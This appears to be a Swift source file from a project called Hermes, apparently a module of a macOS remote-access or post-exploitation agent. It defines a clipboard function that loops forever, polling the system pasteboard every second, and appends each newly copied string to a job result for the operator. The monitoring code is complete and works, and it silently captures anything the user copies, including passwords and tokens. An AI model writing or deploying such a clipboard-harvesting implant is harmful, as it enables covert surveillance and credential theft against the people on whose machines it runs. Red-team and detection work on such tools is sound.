//
//  clipboard.swift
//  Hermes
//
//  Created by Justin Bui on 7/7/21.
//

import Foundation
import Cocoa

func clipboard(job: Job) {
    job.status = "clipboard"
    
    let pasteboard = NSPasteboard.general
    var changeCount = NSPasteboard.general.changeCount
    var tempClipboardData = ""
    while true {
        Thread.sleep(forTimeInterval: 1.0)
        if let clipboardData = pasteboard.string(forType: .string)
        {
            if pasteboard.changeCount != changeCount
            {
                changeCount = pasteboard.changeCount
                
                if tempClipboardData != clipboardData
                {
                    //job.result += "[+] Active Application: \(NSWorkspace.shared.frontmostApplication?.localizedName)\n" //this doesn't work after the first call
                    job.result += "[+] Copy event detected at \(NSDate()) (UTC)!\n"
                    job.result += "[+] Clipboard Data:\n\(clipboardData)\n\n"
                    tempClipboardData = clipboardData
                    
                }
                
            }
        }
    }
}
